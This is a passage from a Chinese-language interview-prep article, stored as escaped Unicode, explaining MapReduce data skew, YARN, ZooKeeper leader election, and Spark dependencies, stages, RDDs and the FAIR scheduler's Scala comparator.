\u548c\u7f51\u7edc\u4f20\u8f93\u7684\u6210\u672c\u3002 \u6bcf\u4e2a\u8ba1\u7b97\u8282\u70b9\u63d0\u4f9b\u7ed9 MapReduce \u7684\u7f13\u5b58\u7684\u5bb9\u91cf\u662f\u6709\u9650\u7684\uff0c\u6570\u636e\u89c4\u6a21\u6bd4\u8f83\u5927\u65f6\uff0c\u7f13\u5b58\u4e2d Map \u7ed3\u679c\u7684\u6570\u91cf\u4f1a\u4e0d\u65ad\u589e\u52a0\uff0c\u5f88\u5feb\u5c31\u4f1a\u5360\u6ee1\u6574\u4e2a\u7f13\u5b58\u3002\u8fd9\u65f6\uff0c\u5c31\u5fc5\u987b\u542f\u52a8\u6ea2\u5199\uff08 Spill \uff09\u64cd\u4f5c\uff0c\u628a\u7f13\u5b58\u4e2d\u7684\u5185\u5bb9\u4e00\u6b21\u6027\u5199\u5165\u78c1\u76d8\uff0c\u5e76\u6e05\u7a7a\u7f13\u5b58\u3002\u5982\u679c\u7528\u6237\u4e8b\u5148\u5b9a\u4e49\u4e86 Combiner \u51fd\u6570\uff0c\u5219\u8fd9\u4e2a\u65f6\u5019\u4f1a\u6267\u884c\u5408\u5e76\u64cd\u4f5c\uff0c\u4ece\u800c\u51cf\u5c11\u9700\u8981\u6ea2\u5199\u5230\u78c1\u76d8\u7684\u6570\u636e\u91cf\u3002 \u5728Reduce\u4efb\u52a1\u5f00\u59cb\u524d\uff0c\u5b83\u9700\u8981\u4eceMap\u7aef\u201c\u9886\u53d6\u201d\uff08 Fetch \uff09\u5bf9\u5e94\u5206\u533a\u7684\u6570\u636e\uff0c\u8fd9\u65f6\u5019\u6570\u636e\u53ef\u80fd\u9700\u8981\u901a\u8fc7\u7f51\u7edc\u4f20\u8f93\uff0c Combine \u51cf\u5c11\u6570\u636e\u89c4\u6a21\u4ee5\u540e\uff0c\u7f51\u7edc\u4f20\u8f93\u6240\u6d88\u8017\u7684\u65f6\u95f4\u4e5f\u80fd\u591f\u51cf\u5c11\u3002 2.3. MapReduce\u51fa\u73b0\u6570\u636e\u503e\u659c\u600e\u4e48\u89e3\u51b3 # \u901a\u8fc7\u5bf9 Shuffle key \u201c\u52a0\u76d0\u201d\uff08\u5373 add salt \uff09\u4f18\u5316\uff0c\u4e5f\u5c31\u662f\u5728\u54c8\u5e0c\u51fd\u6570\u4e2d\u5bf9 Key \u52a0\u5165\u968f\u673a\u566a\u58f0\uff0c\u907f\u514d\u51fa\u73b0\u6570\u636e\u503e\u659c \u4f7f\u7528\u66f4\u597d\u7684\u5206\u533a\u51fd\u6570\uff0c\u4f7f\u5206\u533a\u5c3d\u53ef\u80fd\u5747\u5300 \u8bbe\u7f6e Combiner \u51fd\u6570\uff0c\u51cf\u5c11\u6570\u636e\u89c4\u6a21 \u89e3\u51b3 Hive \u4e2d Group by \u5f15\u8d77\u7684\u503e\u659c set hive.map.aggr = true set hive.groupby.skewindata=true \u6b64\u65f6 Hive \u5728\u6570\u636e\u503e\u659c\u7684\u65f6\u5019\u4f1a\u8fdb\u884c\u8d1f\u8f7d\u5747\u8861\uff0c\u751f\u6210\u7684\u67e5\u8be2\u8ba1\u5212\u4f1a\u6709\u4e24\u4e2a MapReduce Job \u3002\u7b2c\u4e00\u4e2a MapReduce Job \u4e2d\uff0c Map \u7684\u8f93\u51fa\u7ed3\u679c\u96c6\u5408\u4f1a\u968f\u673a\u5206\u5e03\u5230 Reduce \u4e2d\uff0c\u6bcf\u4e2a Reduce \u505a\u90e8\u5206\u805a\u5408\u64cd\u4f5c\u5e76\u8f93\u51fa\u7ed3\u679c\uff0c\u8fd9\u6837\u5904\u7406\u7684\u7ed3\u679c\u662f\u76f8\u540c\u7684 GroupBy Key \u6709\u53ef\u80fd\u88ab\u5206\u5e03\u5230\u4e0d\u540c\u7684 Reduce \u4e2d\uff0c\u4ece\u800c\u8fbe\u5230\u8d1f\u8f7d\u5747\u8861\u7684\u76ee\u7684\uff1b\u7b2c\u4e8c\u4e2a Map Reduce Job \u518d\u6839\u636e\u9884\u5904\u7406\u7684\u6570\u636e\u7ed3\u679c\u6309\u7167 GroupBy Key \u5206\u5e03\u5230 Reduce \u4e2d\uff08\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u4fdd\u8bc1\u76f8\u540c\u7684 GroupBy Key \u88ab\u5206\u5e03\u5230\u540c\u4e00\u4e2a Reduce \u4e2d\uff09\uff0c\u6700\u540e\u5b8c\u6210\u6700\u7ec8\u7684\u805a\u5408\u64cd\u4f5c\u3002 \u53c2\u8003\u81ea \u77e5\u4e4e\u56de\u7b54 \u3002 2.4. \u4ecb\u7ecdYarn # YARN \u662f Hadoop \u7684\u96c6\u7fa4\u8d44\u6e90\u7ba1\u7406\u7cfb\u7edf\uff0c\u5728 Hadoop 2 \u4e2d\u88ab\u5f15\u5165\uff0c\u6700\u521d\u662f\u4e3a\u4e86\u6539\u5584 MapReduce \u7684\u7f3a\u9677\uff0c\u540c\u65f6 YARN \u4e5f\u5177\u6709\u901a\u7528\u6027\uff0c\u540c\u6837\u53ef\u4ee5\u652f\u6301\u5176\u4ed6\u7684\u5206\u5e03\u5f0f\u8ba1\u7b97\u6a21\u5f0f\u3002 \u65e7\u7248\u672c MapReduce \u4e2d\u7684 JobTracker/TaskTracker \u5728\u53ef\u6269\u5c55\u6027\u3001\u5185\u5b58\u6d88\u8017\u3001\u53ef\u9760\u6027\u548c\u7ebf\u7a0b\u6a21\u578b\u65b9\u9762\u5b58\u5728\u5f88\u591a\u95ee\u9898\uff0c\u9700\u8981\u5f00\u53d1\u8005\u505a\u5f88\u591a\u8c03\u6574\u6765\u4fee\u590d\u3002 YARN \u7684\u6838\u5fc3\u601d\u60f3\u662f\u5c06\u529f\u80fd\u5206\u5f00\uff0c\u5728 MR1 \u4e2d\uff0c JobTracker \u6709\u4e24\u4e2a\u529f\u80fd\uff0c\u4e00\u4e2a\u662f\u8d44\u6e90\u7ba1\u7406\uff0c\u53e6\u4e00\u4e2a\u662f\u4f5c\u4e1a\u8c03\u7528\u3002\u5728 YARN \u4e2d\u5219\u5206\u522b\u7531 ResourceManager \u548c ApplicationMaster \u8fdb\u7a0b\u6765\u5b9e\u73b0\u3002\u5176\u4e2d\uff0c ResourceManager \u8fdb\u7a0b\u5b8c\u6210\u6574\u4e2a\u96c6\u7fa4\u7684\u8d44\u6e90\u7ba1\u7406\u548c\u8c03\u5ea6\uff0c\u800c Application Master \u8fdb\u7a0b\u5219\u8d1f\u8d23\u5e94\u7528\u7a0b\u5e8f\u7684\u76f8\u5173\u4e8b\u52a1\uff0c\u5982\u4efb\u52a1\u8c03\u5ea6\u3001\u5bb9\u9519\u548c\u4efb\u52a1\u76d1\u63a7\u7b49\u3002 \u7cfb\u7edf\u4e2d\u6240\u6709\u5e94\u7528\u8d44\u6e90\u8c03\u5ea6\u7684\u6700\u7ec8\u51b3\u5b9a\u6743\u7531 ResourceManager \u62c5\u5f53\u3002\u6bcf\u4e2a\u5e94\u7528\u7684 ApplicationMaster \u4ece ResourceManager \u8c03\u5ea6\u8d44\u6e90\u5e76\u548c Node Maneger \u4e00\u540c\u6267\u884c\u76d1\u63a7\u4efb\u52a1\uff0c NodeManager \u4f1a\u901a\u8fc7\u5fc3\u8df3\u4fe1\u606f\u5411 ResourceManager \u6c47\u62a5\u81ea\u5df1\u6240\u5728\u8282\u70b9\u7684\u8d44\u6e90\u4f7f\u7528\u60c5\u51b5\u3002 2.5. \u4ecb\u7ecdZookeeper # Zookeeper \u662f\u4e00\u79cd\u5206\u5e03\u5f0f\u534f\u8c03\u670d\u52a1\uff0c\u901a\u5e38\u62c5\u4efb\u534f\u8c03\u8005\u7684\u89d2\u8272\uff0c\u4e3b\u8981\u63d0\u4f9b\u7684\u670d\u52a1\u6709 Leader \u9009\u4e3e\u3001\u8d1f\u8f7d\u5747\u8861\u3001\u5206\u5e03\u5f0f\u961f\u5217\u548c\u5206\u5e03\u5f0f\u9501\u7b49\u3002 Leader\u9009\u4e3e \u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u5e38\u89c1\u7684\u4e00\u79cd\u8f6f\u4ef6\u8bbe\u8ba1\u67b6\u6784\u4e3a Master/Slave \u3002\u5176\u4e2d Master \u8d1f\u8d23\u96c6\u7fa4\u7ba1\u7406\uff0c Slave \u8d1f\u8d23\u6267\u884c\u5177\u4f53\u7684\u4efb\u52a1\uff08\u6bd4\u5982\u5b58\u50a8\u6570\u636e\u3001\u5904\u7406\u6570\u636e\uff09\u3002\u4e3a\u4e86\u907f\u514d Master \u51fa\u73b0\u6545\u969c\u5bfc\u81f4\u6574\u4e2a\u96c6\u7fa4\u4e0d\u53ef\u7528\uff0c\u5e38\u89c1\u7684\u4f18\u5316\u65b9\u5f0f\u662f\u5f15\u5165\u591a Master \u3002\u8fd9\u53c8\u5e26\u6765\u4e86\u65b0\u7684\u95ee\u9898\uff0c\u6bd4\u5982\u5982\u4f55\u9009\u4e3e\u51fa\u4e00\u4e2a Master \u4f5c\u4e3a Active Master \uff1f\u5982\u4f55\u907f\u514d\u51fa\u73b0\u8111\u88c2\uff08 Split-Brain \uff09\uff0c\u5373\u96c6\u7fa4\u4e2d\u540c\u65f6\u5b58\u5728\u4e24\u4e2a Active Master \uff0c\u9020\u6210\u6570\u636e\u4e0d\u4e00\u81f4\u6216\u96c6\u7fa4\u51fa\u73b0\u6df7\u4e71\u7684\u73b0\u8c61\u3002 Zookeeper \u63d0\u4f9b ZAB\uff08\uff08ZooKeeper Atomic Broadcast\uff09 \u534f\u8bae\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 ZAB \u534f\u8bae\u4e2d\u9009\u4e3e\u8fc7\u7a0b\u5982\u4e0b\u3002 \u6bcf\u4e2a Follower \u90fd\u5411\u5176\u4ed6\u8282\u70b9\u53d1\u9001\u9009\u81ea\u8eab\u4e3a Leader \u7684 Vote \u6295\u7968\u8bf7\u6c42\uff0c\u7b49\u5f85\u56de\u590d\uff1b Follower \u63a5\u53d7\u5230\u7684 Vote \u4e2d\u7684 ZXID \u5982\u679c\u6bd4\u81ea\u8eab\u7684\u5927\u65f6\u5219\u6295\u7968\uff0c\u5e76\u66f4\u65b0\u81ea\u8eab\u7684 Vote \uff0c\u82e5 ZXID \u4e00\u81f4\uff0c\u5219\u6bd4\u8f83\u670d\u52a1\u5668\u7684 \u552f\u4e00ID \uff08 MyId \uff09\uff0c\u82e5 Vote \u4e2d\u7684 MyId \u66f4\u5927\uff0c\u5219\u6295\u7968\uff0c\u5176\u4ed6\u60c5\u51b5\u5219\u62d2\u7edd\u6295\u7968\uff1b \u6bcf\u4e2a Follower \u4e2d\u7ef4\u62a4\u7740\u4e00\u4e2a\u6295\u7968\u8bb0\u5f55\u8868\uff0c\u5f53\u67d0\u4e2a\u8282\u70b9\u6536\u5230\u8fc7\u534a\u7684\u6295\u7968\u65f6\uff0c\u7ed3\u675f\u6295\u7968\u5e76\u628a\u8be5 Follower \u9009\u4e3a Leader \uff0c\u6295\u7968\u7ed3\u675f\uff1b \u53c2\u8003\u81ea \u7b80\u4e66\u6587\u7ae0 \u548c CSDN\u6587\u7ae0 \u3002 \u8d1f\u8f7d\u5747\u8861 Watcher \u662f ZooKeeper \u63d0\u4f9b\u7684\u53d1\u5e03/\u8ba2\u9605\u673a\u5236\uff0c\u7528\u6237\u53ef\u5728\u67d0\u4e2a Znode \u4e0a\u6ce8\u518c Watcher \u4ee5\u76d1\u542c\u5b83\u7684\u53d8\u5316\uff0c\u4e00\u65e6\u5bf9\u5e94\u7684 Znode \u88ab\u5220\u9664\u6216\u8005\u66f4\u65b0\uff08\u5305\u62ec\u5220\u9664\u3001\u6570\u636e\u57df\u88ab\u4fee\u6539\u3001\u5b50\u8282\u70b9\u53d1\u751f\u53d8\u5316\u7b49\uff09\uff0c ZooKeeper \u5c06\u4ee5\u4e8b\u4ef6\u7684\u5f62\u5f0f\u5c06\u53d8\u5316\u5185\u5bb9\u53d1\u9001\u7ed9\u76d1\u542c\u8005\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c Watcher \u4e00\u65e6\u89e6\u53d1\u540e\u4fbf\u4f1a\u88ab\u5220\u9664\uff0c\u9664\u975e\u7528\u6237\u518d\u6b21\u6ce8\u518c\u8be5 Watcher \u3002 \u7528\u6237\u53ea\u6709\u5728\u7b2c\u4e00\u6b21\u8c03\u7528\u670d\u52a1\u65f6\u9700\u8981\u67e5\u8be2\u914d\u7f6e\u4e2d\u5fc3\uff0c\u914d\u7f6e\u4e2d\u5fc3\u901a\u8fc7\u8d1f\u8f7d\u5747\u8861\u7b97\u6cd5\u9009\u53d6\u5176\u4e2d\u4e00\u53f0\u670d\u52a1\u5668\u5e76\u8fd4\u56de\u670d\u52a1\u4fe1\u606f\uff0c\u7528\u6237\u4f1a\u5c06\u67e5\u8be2\u5230\u7684\u670d\u52a1\u4fe1\u606f\u7f13\u5b58\u5230\u672c\u5730\uff0c\u540e\u9762\u7684\u8c03\u7528\u76f4\u63a5\u4f7f\u7528\u672c\u5730\u7f13\u5b58\u7684\u670d\u52a1\u5730\u5740\u4fe1\u606f\u3002\u5f53 Znode \u53d1\u751f\u53d8\u5316\u65f6\uff0c\u5b83\u4f1a\u89e6\u53d1 Watcher \u91cd\u65b0\u8fdb\u884c\u670d\u52a1\u5730\u5740\u7684\u67e5\u8be2\u3002 \u8fd9\u79cd\u65e0\u4e2d\u5fc3\u5316\u7684\u7ed3\u6784\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u670d\u52a1\u4fe1\u606f\u6ca1\u6709\u53d8\u66f4\u65f6\uff0c\u51e0\u4e4e\u4e0d\u4f9d\u8d56\u914d\u7f6e\u4e2d\u5fc3\uff0c\u89e3\u51b3\u4e86\u4e4b\u524d\u8d1f\u8f7d\u5747\u8861\u8bbe\u5907\u6240\u5bfc\u81f4\u7684\u5355\u70b9\u6545\u969c\u7684\u95ee\u9898\uff0c\u5e76\u4e14\u5927\u5927\u964d\u4f4e\u4e86\u914d\u7f6e\u4e2d\u5fc3\u7684\u538b\u529b\u3002 \u53c2\u8003\u81ea \u535a\u5ba2\u56ed\u6587\u7ae0 \u3002 \u8bfb\u5199\u4e00\u81f4\u6027 \u8bfb\u8def\u5f84\uff1a\u4efb\u610f\u4e00\u4e2a ZooKeeper \u5b9e\u4f8b\u5747\u53ef\u4e3a\u5ba2\u6237\u7aef\u63d0\u4f9b\u8bfb\u670d\u52a1\u3002 ZooKeeper \u5b9e\u4f8b\u6570\u76ee\u8d8a\u591a\uff0c\u8bfb\u541e\u5410\u7387\u8d8a\u9ad8\u3002 \u5199\u8def\u5f84\uff1a\u4efb\u610f\u4e00\u4e2a ZooKeeper \u5b9e\u4f8b\u5747\u53ef\u63a5\u53d7\u5ba2\u6237\u7aef\u7684\u5199\u8bf7\u6c42\uff0c\u4f46\u9700\u8fdb\u4e00\u6b65\u8f6c\u53d1\u7ed9leader\u534f\u8c03\u5b8c\u6210\u5206\u5e03\u5f0f\u5199\u3002 ZAB \u534f\u8bae\u89c4\u5b9a\uff0c\u53ea\u8981\u591a\u6570 ZooKeeper \u5b9e\u4f8b\u5199\u6210\u529f\uff0c\u5c31\u8ba4\u4e3a\u672c\u6b21\u5199\u662f\u6210\u529f\u7684\u3002 ZooKeeper \u96c6\u7fa4\u4e2d\uff0c\u968f\u7740 ZooKeeper \u5b9e\u4f8b\u6570\u76ee\u7684\u589e\u591a\uff0c\u8bfb\u541e\u5410\u7387\u5347\u9ad8\uff0c\u4f46\u5199\u5ef6\u8fdf\u589e\u52a0\u3002\u4e3a\u4e86\u89e3\u51b3\u96c6\u7fa4\u6269\u5c55\u6027\u5bfc\u81f4\u5199\u6027\u80fd\u4e0b\u964d\u7684\u95ee\u9898\uff0c ZooKeeper \u5f15\u5165\u4e86\u7b2c\u4e09\u4e2a\u89d2\u8272\uff1a Observer \u3002 Observer \u5e76\u4e0d\u53c2\u4e0e\u6295\u7968\u8fc7\u7a0b\uff0c\u9664\u6b64\u4e4b\u5916\uff0c\u5b83\u7684\u529f\u80fd\u4e0e Follower \u7c7b\u4f3c\u3002 3. Spark # 3.1. Spark\u7684\u5bbd\u7a84\u4f9d\u8d56 # \u7a84\u4f9d\u8d56\u6307\u7684\u662f\u6bcf\u4e00\u4e2a Parent RDD \u7684 Partition \u6700\u591a\u88ab\u5b50 RDD \u7684\u4e00\u4e2a Partition \u4f7f\u7528 \u5bbd\u4f9d\u8d56\u6307\u7684\u662f\u591a\u4e2a\u5b50 RDD \u7684 Partition \u4f1a\u4f9d\u8d56\u540c\u4e00\u4e2a Parent RDD \u7684 Partition 3.2. Spark\u7684Stage\u662f\u600e\u4e48\u5212\u5206\u7684\uff0c\u5982\u4f55\u4f18\u5316 # \u5bbd\u4f9d\u8d56\u5c31\u662f Spark \u5212\u5206 Stage \u7684\u4f9d\u636e\u3002 \u5bf9\u4e8e\u7a84\u4f9d\u8d56\uff0c\u7531\u4e8e Partition \u4f9d\u8d56\u5173\u7cfb\u7684\u786e\u5b9a\u6027\uff0c Partition \u7684\u8f6c\u6362\u5904\u7406\u5c31\u53ef\u4ee5\u5728\u540c\u4e00\u4e2a\u7ebf\u7a0b\u91cc\u5b8c\u6210\uff0c\u7a84\u4f9d\u8d56\u88ab Spark \u5212\u5206\u5230\u540c\u4e00\u4e2a\u6267\u884c\u9636\u6bb5\u3002 \u5bf9\u4e8e\u5bbd\u4f9d\u8d56\uff0c\u7531\u4e8e Shuffle \u7684\u5b58\u5728\uff0c\u53ea\u80fd\u5728 parent RDD\uff08s\uff09 Shuffle \u5904\u7406\u5b8c\u6210\u540e\uff0c\u624d\u80fd\u5f00\u59cb\u63a5\u4e0b\u6765\u7684\u8ba1\u7b97\uff0c\u56e0\u6b64\u5bbd\u4f9d\u8d56\u5c31\u662f Spark \u5212\u5206 Stage \u7684\u4f9d\u636e\uff0c\u5373 Spark \u6839\u636e\u5bbd\u4f9d\u8d56\u5c06 DAG \u5212\u5206\u4e3a\u4e0d\u540c\u7684 Stage \u3002 \u5728\u4e00\u4e2a Stage \u5185\u90e8\uff0c\u6bcf\u4e2a Partition \u90fd\u4f1a\u88ab\u5206\u914d\u4e00\u4e2a\u8ba1\u7b97\u4efb\u52a1 \uff08Task\uff09 \uff0c\u8fd9\u4e9b Task \u662f\u53ef\u4ee5\u5e76\u884c\u6267\u884c\u7684\u3002 Stage \u4e4b\u95f4\u6839\u636e\u4f9d\u8d56\u5173\u7cfb\u53d8\u6210\u4e86\u4e00\u4e2a\u5927\u7c92\u5ea6\u7684 DAG \uff0c\u8fd9\u4e2a DAG \u7684\u6267\u884c\u987a\u5e8f\u4e5f\u662f\u4ece\u524d\u5411\u540e\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c Stage \u53ea\u6709\u5728\u5b83\u6ca1\u6709 Parent Stage \u6216\u8005 Parent Stage \u90fd\u5df2\u7ecf\u6267\u884c\u5b8c\u6210\u540e\uff0c\u624d\u53ef\u4ee5\u6267\u884c\u3002 \u4f18\u5316\uff1a \u5728\u8fdb\u884c Shuffle \u64cd\u4f5c\u65f6\uff0c\u4f1a\u5212\u5206\u65b0\u7684 Stage \u3002\u6240\u4ee5\u9700\u8981\u5c3d\u91cf\u51cf\u5c11 Shuffle \u64cd\u4f5c\u3002\u51cf\u5c11 reduceByKey\u3001groupByKey\uff0cdistinct\uff0cintersection \u64cd\u4f5c\uff0c\u7528\u5176\u4ed6\u7684\u64cd\u4f5c\u8fdb\u884c\u4ee3\u66ff\u3002 3.3. \u4ecb\u7ecdSpark\u7684RDD # RDD \u662f\u53ea\u8bfb\u7684\u3001\u5206\u533a\u8bb0\u5f55\u7684\u96c6\u5408\u3002 RDD \u652f\u6301\u57fa\u4e8e\u5de5\u4f5c\u96c6\u7684\u5e94\u7528\uff0c\u540c\u65f6\u5177\u6709\u6570\u636e\u6d41\u6a21\u578b\u7684\u7279\u70b9\uff1a\u81ea\u52a8\u5bb9\u9519\u3001\u4f4d\u7f6e\u611f\u77e5\u6027\u8c03\u5ea6\u548c\u53ef\u4f38\u7f29\u6027\u3002 RDD \u5141\u8bb8\u7528\u6237\u5728\u6267\u884c\u591a\u4e2a\u67e5\u8be2\u65f6\u663e\u5f0f\u5730\u5c06\u5de5\u4f5c\u96c6\u7f13\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u540e\u7eed\u7684\u67e5\u8be2\u80fd\u591f\u91cd\u7528\u5de5\u4f5c\u96c6\uff0c\u8fd9\u6781\u5927\u5730\u63d0\u5347\u4e86\u67e5\u8be2\u901f\u5ea6\u3002 \u6bcf\u4e2a RDD \u67095\u4e2a\u4e3b\u8981\u7684\u5c5e\u6027\uff1a \u4e00\u7ec4\u5206\u7247 \uff08Partition\uff09 \uff0c\u5373\u6570\u636e\u96c6\u7684\u57fa\u672c\u7ec4\u6210\u5355\u4f4d\u3002\u5bf9\u4e8e RDD \u6765\u8bf4\uff0c\u6bcf\u4e2a\u5206\u7247\u90fd\u4f1a\u88ab\u4e00\u4e2a\u8ba1\u7b97\u4efb\u52a1\u5904\u7406\uff0c\u5e76\u51b3\u5b9a\u5e76\u884c\u8ba1\u7b97\u7684\u7c92\u5ea6\u3002\u7528\u6237\u53ef\u4ee5\u5728\u521b\u5efa RDD \u65f6\u6307\u5b9a RDD \u7684\u5206\u7247\u4e2a\u6570\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a\uff0c\u90a3\u4e48\u5c31\u4f1a\u91c7\u7528\u9ed8\u8ba4\u503c\u3002 \u4e00\u4e2a\u8ba1\u7b97\u6bcf\u4e2a\u5206\u533a\u7684\u51fd\u6570\u3002\u80fd\u591f\u901a\u8fc7\u5bf9\u524d\u4e00\u6b65\u4f9d\u8d56\u7684\u6570\u636e\u8fdb\u884c\u8ba1\u7b97\uff0c\u5f97\u5230\u5f53\u524d RDD \u7684\u6570\u636e\u3002 RDD \u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\u3002 RDD \u7684\u6bcf\u6b21\u8f6c\u6362\u90fd\u4f1a\u751f\u6210\u4e00\u4e2a\u65b0\u7684 RDD \uff0c\u6240\u4ee5 RDD \u4e4b\u95f4\u5c31\u4f1a\u5f62\u6210\u7c7b\u4f3c\u4e8e\u6d41\u6c34\u7ebf\u4e00\u6837\u7684\u524d\u540e\u4f9d\u8d56\u5173\u7cfb\u3002\u5728\u90e8\u5206\u5206\u533a\u6570\u636e\u4e22\u5931\u65f6\uff0c Spark \u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u4f9d\u8d56\u5173\u7cfb\u91cd\u65b0\u8ba1\u7b97\u4e22\u5931\u7684\u5206\u533a\u6570\u636e\uff0c\u800c\u4e0d\u662f\u5bf9 RDD \u7684\u6240\u6709\u5206\u533a\u8fdb\u884c\u91cd\u65b0\u8ba1\u7b97\u3002 \u4e00\u4e2a Partitioner \uff0c\u5373 RDD \u7684\u5206\u7247\u51fd\u6570\u3002\u5f53\u524d Spark \u4e2d\u5b9e\u73b0\u4e86\u4e24\u79cd\u7c7b\u578b\u7684\u5206\u7247\u51fd\u6570\uff0c\u4e00\u4e2a\u662f\u57fa\u4e8e\u54c8\u5e0c\u7684 HashPartitioner \uff0c\u53e6\u5916\u4e00\u4e2a\u662f\u57fa\u4e8e\u8303\u56f4\u7684 RangePartitioner \u3002 \u4e00\u4e2a\u5217\u8868\uff0c\u5b58\u50a8\u5b58\u53d6\u6bcf\u4e2a Partition \u7684\u4f18\u5148\u4f4d\u7f6e \uff08preferred location\uff09 \u3002 3.4. Spark\u7684TaskScheduler\u662f\u600e\u4e48\u5206\u914dTask\u7684 # FIFO\u8c03\u5ea6 \u5bf9 s1 \u548c s2 \u4e24\u4e2a Schedulable \u7684\u4f18\u5148\u7ea7\uff08\u503c\u8d8a\u5c0f\uff0c\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff09\u8fdb\u884c\u6bd4\u8f83\u3002 \u5982\u679c\u4e24\u4e2a Schedulable \u7684\u4f18\u5148\u7ea7\u76f8\u540c\uff0c\u5219\u5bf9 s1 \u548c s2 \u6240\u5c5e\u7684 Stage \u7684\u8eab\u4efd\u6807\u8bc6\u8fdb\u884c\u6bd4\u8f83\u3002 \u5982\u679c\u6bd4\u8f83\u7684\u7ed3\u679c\u5c0f\u4e8e 0 \uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s1 \uff0c\u5426\u5219\u4f18\u5148\u8c03\u5ea6 s2 \u3002 FAIR\u8c03\u5ea6 \u9996\u5148\u5b9a\u4e49 minShare \u548c weight \u4e24\u4e2a\u53c2\u6570\u3002 \u8c03\u5ea6\u4ee3\u7801\u5982\u4e0b\u3002 private[spark] class FairSchedulingAlgorithm extends SchedulingAlgorithm { override def comparator(s1: Schedulable, s2: Schedulable): Boolean = { val minShare1 = s1.minShare val minShare2 = s2.minShare val runningTasks1 = s1.runningTasks val runningTasks2 = s2.runningTasks val s1Needy = runningTasks1 < minShare1 val s2Needy = runningTasks2 < minShare2 val minShareRatio1 = runningTasks1.toDouble / math.max(minShare1, 1.0) val minShareRatio2 = runningTasks2.toDouble / math.max(minShare2, 1.0) val taskToWeightRatio1 = runningTasks1.toDouble / s1.weight.toDouble val taskToWeightRatio2 = runningTasks2.toDouble / s2.weight.toDouble var compare = 0 if (s1Needy & & !s2Needy) { return true }else if (!s1Needy & & s2Needy) { return false } else if (s1Needy & & s2Needy) { compare = minShareRatio1.compareTo(minShareRatio2) } else { compare = taskToWeightRatio1.compareTo(taskToWeightRatio2) } if (compare < 0) { true } else if (compare > 0) { false } else { s1.name < s2.name } } } \u6982\u8ff0\u89c4\u5219\u5982\u4e0b\uff1a \u4f18\u5148\u8c03\u5ea6\u8fd0\u884c\u4e2d\u7684 Task \u6570\u91cf\u6bd4 minShare \u5c0f\u7684\u4efb\u52a1\u3002 \u5982\u679c\u4e24\u4e2a\u4efb\u52a1\u7684 Task \u6570\u91cf\u90fd\u6bd4 minShare \u5c0f\uff0c\u5219\u8003\u8651 Task \u548c minShare \u7684\u6bd4\u503c\uff0c\u6bd4\u503c\u5c0f\u7684\u4f18\u5148\u8c03\u5ea6\uff0c\u6bd4\u503c\u76f8\u7b49\u5219\u6bd4\u8f83\u4efb\u52a1\u540d\uff0c\u4efb\u52a1\u540d\u8f83\u5c0f\u7684\u4f18\u5148\u8c03\u5ea6\u3002 \u5982\u679c\u4e24\u4e2a\u4efb\u52a1\u7684 Task \u6570\u91cf\u90fd\u6bd4 minShare \u5927\uff0c\u5219\u8003\u8651 Task \u548c weight \u7684\u6bd4\u503c\uff0c\u6bd4\u503c\u5c0f\u7684\u4f18\u5148\u8c03\u5ea6\uff0c\u6bd4\u503c\u76f8\u7b49\u5219\u6bd4\u8f83\u4efb\u52a1\u540d\uff0c\u4efb\u52a1\u540d\u8f83\u5c0f\u7684\u4f18\u5148\u8c03\u5ea6\u3002 \u5177\u4f53\u89c4\u5219\u5982\u4e0b\uff1a \u5982\u679c s1 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5c0f\u4e8e s1 \u7684 minShare \uff0c\u5e76\u4e14 s2 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5927\u4e8e\u7b49\u4e8e s2 \u7684 minShare \uff0c\u90a3\u4e48\u4f18\u5148\u8c03\u5ea6 s1 \u3002 \u5982\u679c s1 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5927\u4e8e\u7b49\u4e8e s1 \u7684 minShare \uff0c\u5e76\u4e14 s2 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5c0f\u4e8e s2 \u7684 minShare \uff0c\u90a3\u4e48\u4f18\u5148\u8c03\u5ea6 s2 \u3002 \u5982\u679c s1 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5c0f\u4e8e s1 \u7684 minShare \uff0c\u5e76\u4e14 s2 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5c0f\u4e8e s2 \u7684 minShare \uff0c\u90a3\u4e48\u518d\u5bf9 minShareRatio1 \u548c minShareRatio2 \u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c minShareRatio1 \u5c0f\u4e8e minShareRatio2 \uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s1 \uff1b\u5982\u679c minShareRatio2 \u5c0f\u4e8e minShareRatio1 \uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s2 \u3002\u5982\u679c minShareRatio1 \u548c minShareRatio2 \u76f8\u7b49\uff0c\u8fd8\u9700\u8981\u5bf9 s1 \u548c s2 \u7684\u540d\u5b57\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c s1 \u7684\u540d\u5b57\u5c0f\u4e8e s2 \u7684\u540d\u5b57\uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s1 \uff0c\u5426\u5219\u4f18\u5148\u8c03\u5ea6 s2 \u3002 minShareRatio \u662f\u6b63\u5728\u8fd0\u884c\u7684\u4efb\u52a1\u6570\u91cf\u4e0e minShare \u4e4b\u95f4\u7684\u6bd4\u503c\u3002 \u5982\u679c s1 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5927\u4e8e\u7b49\u4e8e s1 \u7684 minShare \uff0c\u5e76\u4e14 s2 